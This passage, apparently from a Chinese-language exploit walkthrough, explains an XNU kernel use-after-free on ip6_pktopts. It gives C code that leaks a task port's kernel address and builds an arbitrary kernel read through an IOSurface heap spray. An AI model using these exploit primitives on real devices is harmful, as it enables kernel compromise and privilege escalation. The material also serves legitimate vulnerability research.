    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_OOL_PORTS_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_PHYSICAL_COPY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                   &lt;span class=&quot;n&quot;&gt;MACH_SEND_MSG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_MSG_OPTION_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                   &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                   &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                   &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                   &lt;span class=&quot;n&quot;&gt;MACH_MSG_TIMEOUT_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                   &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_pktopts&lt;/code&gt;的大小是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192&lt;/code&gt;，我没找到对应的头文件来导入这个结构体，笨办法把整个结构体拷贝出来了，然后调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sizeof()&lt;/code&gt;来计算，这里根据结构体的成员分布，选择了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6po_minmtu&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6po_prefer_tempaddr&lt;/code&gt;进行组合，同时增加了内核指针特征进行判断&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;find_port_via_uaf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_socket_with_dangling_options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fill_kalloc_with_port_pointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;192&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_COPY_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;get_minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// this is like doing rk32(options + 180);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;get_prefertempaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// this like rk32(options + 184);&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mtu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff00000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pref&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000ffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mtu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffff00&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mtu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pref&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;mach_port_destroy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;mach_port_destroy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;5-泄露ipc_space内核地址&quot;&gt;5. 泄露IPC_SPACE内核地址&lt;/h2&gt;

&lt;p&gt;在泄露&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task Port&lt;/code&gt;内核态地址的时候，我们利用的是传输Port过程中内核自动将其转换为内核态地址的机制往可控的内存里填充数据，而想要泄露内核任意地址上的数据，就需要使用更加稳定的方式实现原语&lt;/p&gt;

&lt;p&gt;首先来看结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_pktopts&lt;/code&gt;，现在有一个指针指向这一片已经释放掉的内核空间，我们通过某些方式可以让这片内核空间写上我们构造的数据，那么就有几个问题需要解决&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;怎么申请到这片内存并将数据写进去？&lt;/li&gt;
  &lt;li&gt;怎么利用写进去的数据实现内核任意地址读原语？&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6_pktopts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Pointer to mbuf storing the data */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6po_hlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Hoplimit for outgoing packets */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;in6_pktinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_pktinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6po_nhinfo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6po_nhinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6_hbh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_hbh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Hop-by-Hop options header */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6_dest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_dest1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6po_rhinfo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6po_rhinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6_dest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_dest2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6po_tclass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* traffic class */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6po_minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* fragment vs PMTU discovery policy */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6po_prefer_tempaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6po_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第二个问题比较好解决，我们可以看到结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_pktopts&lt;/code&gt;有好几个结构体类型成员，比如结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6po_pktinfo&lt;/code&gt;，那么我们就可以把这个结构体成员所在偏移设置为我们要泄露数据的地址，设置整型变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6po_minmtu&lt;/code&gt;为一个特定值，然后堆喷这个构造好的数据到内存里，利用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getsockopt()&lt;/code&gt;读漏洞Socket的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6po_minmtu&lt;/code&gt;是否为我们标记的特定值&lt;/p&gt;

&lt;p&gt;如果是特定值说明这个漏洞Socket已经成功喷上了我们构造的数据，再通过函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getsockopt()&lt;/code&gt;读取结构体变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6po_pktinfo&lt;/code&gt;的值即可泄露出构造地址的数据，结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;in6_pktinfo&lt;/code&gt;的大小为20字节，所以作者实现了函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read_20_via_uaf()&lt;/code&gt;用于泄露指定地址的数据&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read_20_via_uaf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sockets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_socket_with_dangling_options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6_pktopts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_opts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6_pktopts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fake_opts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_minmtu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41424344&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 设置特征值&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_opts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;164&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41424344&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fake_opts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_pktinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in6_pktinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 设置要读的内核地址&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_at&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;spray_IOSurface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_opts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6_pktopts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 堆喷&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
